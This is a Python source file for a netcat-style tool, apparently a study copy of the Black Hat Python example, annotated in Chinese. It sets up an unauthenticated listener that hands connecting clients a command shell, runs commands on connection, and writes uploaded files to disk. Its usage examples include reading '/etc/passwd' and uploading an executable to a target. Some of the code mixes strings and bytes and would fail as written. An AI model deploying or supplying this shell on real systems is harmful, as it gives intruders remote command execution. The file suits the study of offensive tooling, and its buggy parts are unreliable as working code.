import sys
import socket
import getopt  # 用来处理命令行参数的
import threading
import subprocess
import logging  # 第一次没跑通，搞搞日志

logging.basicConfig(level=logging.WARNING)
# define some global variables
listen = False  # 如True，可理解为服务器。 否则为客户端。
command = False  # 是否建立shell
# upload             = False      #是否上传？？？？   该变量疑似未使用
execute = ""  # 在目标机上执行的命令。
target = ""  # 目标主机
upload_destination = ""  # 数据传送的目标文件。   上传文件，目标路径。
port = 0  # 目标端口号


# 执行命令，并将执行结果返回
def run_command(command):

    # trim the newline
    command = command.rstrip()

    # run the command and get the output back
    try:
        output = subprocess.check_output(
            command, stderr=subprocess.STDOUT, shell=True)
        # subprocess.check_output  -->   Run command with arguments and return its output.
    except Exception as e:
        logging.info(e)
        output = b"Failed to execute command.\r\n"

    # send the output back to the client
    logging.info("output:%s  |||   %s" % (type(output), output))
    return output


# 服务端线程，处理客户的连接任务。
def client_handler(client_socket):
    global upload
    global execute
    global command

    # 检查是否上传文件
    if len(upload_destination):

        # read in all of the bytes and write to our destination
        file_buffer = ""

        # keep reading data until none is available
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # now we take these bytes and try to write them out
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # acknowledge that we wrote the file out
            client_socket.send(
                "Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" %
                               upload_destination)

    # 检查需要执行的命令。
    if len(execute):

        # run the command
        output = run_command(execute)

        client_socket.send(output)

    # now we go into another loop if a command shell was requested
    # 如果command==1，则建立一个新的死循环。
    if command:
        # 不间断的接受客户端发送过来的命令，并反馈执行结果。
        while True:
            # show a simple prompt
            client_socket.send(b"<BHP:#> ")

            # now we receive until we see a linefeed (enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode("utf-8")

            # we have a valid command so execute it and send back the results
            response = run_command(cmd_buffer)

            # send back the response
            client_socket.send(response)


# 服务端侦听客户端发起的连接，根据情况建立子线程以处理任务。
def server_loop():
    global target
    global port

    # if no target is defined we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    logging.info("Listen    %s:%d" % (target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # spin off a thread to handle our new client
        client_thread = threading.Thread(
            target=client_handler, args=(client_socket,))
        client_thread.start()

# 客户端发送消息-->服务端，并接收服务端的回馈消息。


def client_sender(buffer):

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # 连接服务器
        client.connect((target, port))
        logging.info('目标主机   %s:%d' % (target, port))

        # if we detect input from stdin send it
        # if not we are going to wait for the user to punch some in

        if len(buffer):
            logging.info("发送消息：%s" % buffer)
            client.send(buffer.encode("utf-8"))

        while True:

            # now wait for data back
            recv_len = 1
            response = ""

            while recv_len:

                data = client.recv(4096)
                logging.debug("data:%s" % type(data))

                response += data.decode("utf-8")
                logging.debug("response:%s" % type(response))
                if recv_len < 4096:  # 如果小于4096就表示数据已经接受完毕。
                    break

            print(response, end=" ")

            # wait for more input
            buffer = input("")  # python中没有raw_input()
            buffer += "\n"

            logging.info("发送消息：%s" % buffer)
            client.send(buffer.encode("utf-8"))

    except Exception as e:
        logging.debug(e)
        print("[*] Exception! Exiting.")
    finally:
        # teardown the connection
        client.close()

# 使用说明！


def usage():
    print("[Netcat Replacement]")
    print("Usage: replaceNetcat.py -t target_host -p port")
    print(
        "\t-l --listen                - listen on [host]:[port] for incoming connections")
    print("\t-e --execute=file_to_run   - execute the given file upon receiving a connection")
    print("\t-c --command               - initialize a command shell")
    print(
        "\t-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
    print("Examples: ")
    print("\treplaceNetcat.py -t 192.168.0.1 -p 5555 -l -c")
    print("\treplaceNetcat.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("\treplaceNetcat.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("\techo 'ABCDEFGHI' | ./replaceNetcat.py -t 192.168.11.12 -p 135")
    sys.exit(0)


# 主函数，识别参数，以进入不同的工作模式（子函数）
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read the commandline options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", [
                                   "help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # are we going to listen or just send data from stdin
    if not listen and len(target) and port > 0:

        # read in the buffer from the commandline
        # this will block, so send CTRL-D if not sending input
        # to stdin
        buffer = sys.stdin.read()

        # 作为客户端，给服务端发送消息。
        client_sender(buffer)

    # 成为服务端角色，接受client传过来的指令，执行并反馈结果。
    if listen:
        server_loop()


if __name__ == "__main__":
    main()
